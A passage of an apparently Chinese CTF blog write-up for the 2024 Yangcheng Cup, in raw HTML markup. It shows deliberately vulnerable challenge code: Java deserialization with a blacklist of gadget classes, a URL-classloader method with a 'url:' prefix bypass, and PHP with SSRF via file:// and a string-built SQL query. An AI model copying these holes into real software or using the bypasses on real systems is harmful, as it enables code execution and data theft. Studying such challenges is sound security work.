namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserControler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">UserControler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/index"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/ser"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"ser"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> ser<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>ser<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MyObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">handleFileUpload</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> fileName <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> index <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileName<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>fileName<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"..\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> suffix <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">".jsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/templates/"</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">OpenOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token string">"File upload success"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var7<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化和文件上传的功能</p><p>看一下utils</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ycbjava<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InvalidClassException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyObjectInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blacklist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"java.security.SignedObject"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.ldap.LdapAttribute"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.commons.beanutils"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.commons.collections"</span><span class="token punctuation">,</span> <span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xpath.internal.objects.XString"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> blacklist<span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">;</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> var3<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var6 <span class="token operator">&lt;</span> var5<span class="token punctuation">;</span> <span class="token operator">++</span>var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> forbiddenPackage <span class="token operator">=</span> var4<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>forbiddenPackage<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一眼blacklist</p><p>而在 user 中有</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getGift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> gift <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>    gift <span class="token operator">=</span> gift<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gift <span class="token operator">=</span> gift<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>gift<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">||</span> gift<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        gift <span class="token operator">=</span> <span class="token string">"nonono"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URL</span> url1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>gift<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">URLclass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URLClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> add <span class="token operator">=</span> <span class="token class-name">URLclass</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"addURL"</span><span class="token punctuation">,</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        add<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classloader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">URLClassLoader</span><span class="token punctuation">)</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        add<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>classloader<span class="token punctuation">,</span> url1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> gift<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前缀检测这里翻一下 java.net.URL，发现可以用<code>url:</code>绕过</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240828092235138.png" alt="image-20240828092235138"></p><hr><h1 id="网络照相馆（复现）"><a href="#网络照相馆（复现）" class="headerlink" title="网络照相馆（复现）"></a>网络照相馆（复现）</h1><blockquote><p>SSRF + sql注入 + CVE-2024-2961</p></blockquote><p>file协议可以读取文件：<code>file://localhost/var/www/html/url.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//error_reporting(0);</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'sql.php'</span><span class="token punctuation">;</span><span class="token variable">$baseDir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"data/"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$parse</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$baseDir</span> <span class="token operator">.</span>  <span class="token function">get_filename</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">mysqli_prepare</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">mysqli_stmt_bind_param</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mysqli_stmt_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmpInfo</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$tmpInfo</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>    <span class="token variable">$var_size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$random_str</span><span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$var_size</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token variable">$random_str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$res</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$conn</span> <span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT filename from data where url = '<span class="token interpolation"><span class="token variable">$url</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_all</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token 